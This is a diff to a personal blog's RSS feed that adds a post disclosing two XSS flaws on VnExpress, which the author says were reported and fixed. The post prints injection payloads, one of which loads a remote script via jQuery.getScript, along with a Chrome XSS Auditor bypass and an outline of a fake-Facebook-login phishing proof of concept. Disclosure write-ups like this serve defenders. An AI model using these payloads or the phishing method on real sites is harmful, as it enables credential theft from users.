@@ -6,8 +6,94 @@
     <description>Recent content on Cong Nguyen</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Fri, 24 Apr 2015 17:16:23 +0700</lastBuildDate>
+    <lastBuildDate>Tue, 22 Mar 2016 16:20:20 +0700</lastBuildDate>
     <atom:link href="http://blog.ntcong.it/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>XSS vulnerablities on VnExpress</title>
+      <link>http://blog.ntcong.it/post/xss-with-vnexpress/</link>
+      <pubDate>Tue, 22 Mar 2016 16:20:20 +0700</pubDate>
+      
+      <guid>http://blog.ntcong.it/post/xss-with-vnexpress/</guid>
+      <description>
+
+&lt;h1 id=&#34;xss-on-e-vnexpress-net:3b2adbfb4f5b591fc123309bb7eb9de1&#34;&gt;XSS on e.vnexpress.net&lt;/h1&gt;
+
+&lt;p&gt;Recently I found two XSS vulnerablities on vnExpress website. It all begins with the newly introduced English version of VnExpress, and I didn&amp;rsquo;t have to spend a lot of time to find the search box wasn&amp;rsquo;t escaped properly. Just do a search with &amp;ldquo;&amp;gt; will reveal this.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;http://blog.ntcong.it/img/vne/vne1.png&#34; /&gt;
+    
+    
+    &lt;figcaption&gt;
+        &lt;h4&gt;XSS on e.VNE&lt;/h4&gt;
+        
+    &lt;/figcaption&gt;
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Pretty serious problem if anyone still doesn&amp;rsquo;t care about escaping user-input, especially on a search box. Luckily, a normal XSS payload will only works on Firefox, because Chrome and IE have XSS Auditor for a while now (you can still bypass it, which I will tell you later). Also because the site doesn&amp;rsquo;t have user account yet, the best I can do is launching a phishing attack (I jut did a PoC to demo what I can do, not really attack anyone).&lt;/p&gt;
+
+&lt;p&gt;Phishing is also a serious problem for a big website like VnExpress. People trained to trust VnE and will do most thing the website told them to (like give Facebook&amp;rsquo;s password). So it&amp;rsquo;s pretty simple, I can inject my script in the search page already, I load the main site with jQuery.get, replace the top post with a fake Facebook login, replace the HTML content, and then use window.history.pushState to replace the address bar. This way the site will display the main page with its url, not the search page.&lt;/p&gt;
+
+&lt;p&gt;But it&amp;rsquo;s still not very good since it only works on Firefox, so I did a quick look at the HTML source code and found this&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34; style=&#34;background: #002b36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span style=&#34;color: #859900&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color: #839496&#34;&gt;strKeyWord&lt;/span&gt;  &lt;span style=&#34;color: #839496&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2aa198&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #839496&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #dc322f&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #839496&#34;&gt;;&lt;/span&gt;
+&lt;span style=&#34;color: #859900&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color: #839496&#34;&gt;blData&lt;/span&gt;      &lt;span style=&#34;color: #839496&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #2aa198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #839496&#34;&gt;;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Why they include the search parameter on a Javascript code, without any protection is beyond me, but this will bypass all the protection XSS Auditor provides to you, because it&amp;rsquo;s not a normal XSS payload anymore, any text you inputed in will run on javascript directly. The new payload will look like this.
+&lt;div class=&#34;highlight&#34; style=&#34;background: #002b36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span style=&#34;color: #2aa198&#34;&gt;&amp;quot;;alert(1);&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;p&gt;And it will not be detected by Chrome or IE&amp;rsquo;s XSS Auditor. Extensible is a must, so I load the script from outside
+&lt;div class=&#34;highlight&#34; style=&#34;background: #002b36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span style=&#34;color: #2aa198&#34;&gt;&amp;quot;;jQuery.getScript(&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #839496&#34;&gt;http:&lt;/span&gt;&lt;span style=&#34;color: #586e75; font-style: italic&#34;&gt;//js.js&amp;quot;) .done(function() {});&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Pretty neat, huh?&lt;/p&gt;
+
+&lt;p&gt;What should I do to prevent it? Well XSS is never a simple problem to begin with, but at least never ever trust anything the user input, escape it, whitelist the character, make sure they don&amp;rsquo;t input any special characacter, because no one want to search an article with &amp;ldquo;;&amp;rdquo;@(alert(1));&amp;rdquo; anyway. And NEVER use the input directly onto your javascript, it is very dangerous.&lt;/p&gt;
+
+&lt;h1 id=&#34;xss-on-vnexpress-net:3b2adbfb4f5b591fc123309bb7eb9de1&#34;&gt;XSS on vnexpress.net&lt;/h1&gt;
+
+&lt;p&gt;Then I thought, if they fucked up this bad on their new site, the main site should have some weakness as well. One thing they did a little better is, the main search box is properly escaped, but I noticed they put the whole URL onto the Time and Sort filter, so maybe something will not be escaped, like the &amp;ldquo;search_f=&amp;rdquo; parameter.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;http://timkiem.vnexpress.net/?search_f=%22%3E&amp;amp;q=xss&amp;amp;cate_code=&amp;amp;media_type=all&amp;amp;latest=&amp;amp;fromdate=0&amp;amp;todate=0&amp;amp;date_format=all
+&lt;/code&gt;&lt;/pre&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;http://blog.ntcong.it/img/vne/vne2.png&#34; /&gt;
+    
+    
+    &lt;figcaption&gt;
+        &lt;h4&gt;XSS on VNE&lt;/h4&gt;
+        
+    &lt;/figcaption&gt;
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;This time there&amp;rsquo;s no javascript bug on this page, but working only with Firefox is no fun, let&amp;rsquo;s find out how to bypass Chrome.&lt;/p&gt;
+
+&lt;p&gt;So Chrome did a great job to find a XSS payload on the URL, and prevent it from running. But there&amp;rsquo;s a flaw: it won&amp;rsquo;t stop an invalid XSS payload, like a script without closing tag. And the HTML parse won&amp;rsquo;t care about the content inside the &lt;script&gt; tag, as long as you include a src attribute. This payload requires you to have a closing &lt;/script&gt; tag, which most website nowaday have to execute javascript after the main content finishes loading. The payload looks like this&lt;/p&gt;
+
+&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002b36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span style=&#34;color: #dc322f&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #839496&#34;&gt;&amp;gt;&amp;lt;script/src=data:,alert(&lt;/span&gt;&lt;span style=&#34;color: #2aa198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #839496&#34;&gt;)%&lt;/span&gt;&lt;span style=&#34;color: #2aa198&#34;&gt;26&lt;/span&gt;&lt;span style=&#34;color: #839496&#34;&gt;sol;%&lt;/span&gt;&lt;span style=&#34;color: #2aa198&#34;&gt;26&lt;/span&gt;&lt;span style=&#34;color: #839496&#34;&gt;sol;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;p&gt;The result html will looks like this: &amp;lt;script src=&amp;ldquo;data:,alert(1)//&amp;amp;q=xss&amp;hellip;.&amp;ldquo;&amp;gt;[a lot of HTML]&amp;lt;/script&amp;gt;. Andddd it runs on Chrome. And also it&amp;rsquo;s pretty funny to see VnExpress do some weird shit with their site, results in the alert(1) display several times when the page loads (view count increase maybe?)&lt;/p&gt;
+
+&lt;p&gt;Kudos to VnExpress for fixing the bug pretty fast after I reported it to them. But I think they should do something better than having a XSS vuln on the main search box in the first place.&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>How VCB OTP works and How not to do it</title>
